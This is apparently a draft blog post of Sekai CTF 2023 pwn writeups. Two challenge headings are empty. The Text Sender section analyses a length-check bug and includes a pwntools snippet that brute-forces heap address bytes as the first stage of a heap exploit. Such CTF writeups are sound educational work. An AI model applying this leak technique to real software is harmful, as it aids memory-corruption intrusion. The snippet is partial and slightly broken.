---
title: "Sekai 2023 Writeups"
date: 2023-08-30T08:16:54+07:00
draft: true
categories: 
  - writeups
tags:
  - pwn
summary: "Sekai 2023 Writeups"
# featuredImage: 
---

# [pwn 100] Network Tools



# [pwn 100] Cosmic Ray



# [pwn 400] Text Sender



![img](images/double_free_meme.jpg)

Really cool challenge

## analyze

```c
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
```

The program manage a `sender` pointer containing the sender's name and a request list containing request object. A request includes receiver's name and message.

1. set sender: allocate and put `f"Sender: {input}"` into `sender` pointer
2. add message: allocate request object, name and message.
3. edit message: iterate through req list, name compare and edit message
4. print all message
5. send all message: free contents of `sender`, request objects and the objects themselves

## leak heap

`getline()` in `edit_message()` accepts input of arbitrarily length, and the name comparison uses the length of input instead of name in request object for length check, which can be abused for brute forcing heap address.

```python
# leak heap 
set_sender("TUYEN")
add(b'XX', b'AA')
send_all()

add(b'XX', b'AA')
add(b'YY', b'AA')
heap = b'\x0a'  # first nibble
payload = b'YY'.ljust(0x78, b'\x00')
payload += p64(0x21)    # size
for i in range(3):
    for c in range(0, 0xff):
        if c == 0xa:
            continue
        ok = edit(payload + heap + p8(c), b'AA')
        if ok:
            heap += p8(c)
            break
log.info("leak heap: " + hex(heap))
```



